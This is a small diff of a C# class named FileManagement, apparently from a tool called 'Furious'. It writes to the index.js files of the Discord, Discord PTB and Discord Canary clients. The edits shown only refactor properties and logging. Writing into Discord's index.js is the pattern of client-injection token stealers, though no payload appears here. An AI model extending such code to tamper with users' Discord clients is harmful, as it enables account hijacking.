@@ -1,4 +1,4 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 
@@ -6,41 +6,6 @@ namespace Furious
 {
 	internal class FileManagement
 	{
-		internal static string PTBPath
-		{
-			get
-			{
-				return FileManagement._ptbpath;
-			}
-			set
-			{
-				FileManagement._ptbpath = value;
-			}
-		}
-		internal static string DiscordPath
-		{
-			get
-			{
-				return FileManagement._discordpath;
-			}
-			set
-			{
-				FileManagement._discordpath = value;
-			}
-		}
-
-		internal static string CanaryPath
-		{
-			get
-			{
-				return FileManagement._canarypath;
-			}
-			set
-			{
-				FileManagement._canarypath = value;
-			}
-		}
-
 		internal static void CleanFile(string path)
 		{
 			try
@@ -52,6 +17,7 @@ namespace Furious
 			}
 			catch
 			{
+				Debug.WriteLine("An error occured cleaning file.");
 			}
 		}
 
@@ -73,7 +39,7 @@ namespace Furious
 				}
 				catch
 				{
-					Debug.Write("Error writing to index.js in Discord path.");
+					Debug.WriteLine("Error writing to index.js in Discord path.");
 				}
 			}
 			if (File.Exists(FileManagement.PTBPath))
@@ -92,7 +58,7 @@ namespace Furious
 				}
 				catch
 				{
-					Debug.Write("Error writing to index.js in DiscordPTB path.");
+					Debug.WriteLine("Error writing to index.js in DiscordPTB path.");
 				}
 			}
 			if (File.Exists(FileManagement.CanaryPath))
@@ -111,11 +77,28 @@ namespace Furious
 				}
 				catch
 				{
-					Debug.Write("Error writing to index.js in Discord Canary path.");
+					Debug.WriteLine("Error writing to index.js in Discord Canary path.");
 				}
 			}
 		}
 
+		internal static string PTBPath
+		{
+			get { return FileManagement._ptbpath; }
+			set { FileManagement._ptbpath = value; }
+		}
+		internal static string DiscordPath
+		{
+			get { return FileManagement._discordpath; }
+			set { FileManagement._discordpath = value; }
+		}
+
+		internal static string CanaryPath
+		{
+			get { return FileManagement._canarypath; }
+			set { FileManagement._canarypath = value; }
+		}
+		
 		internal static string _ptbpath;
 		internal static string _discordpath;
 		internal static string _canarypath;
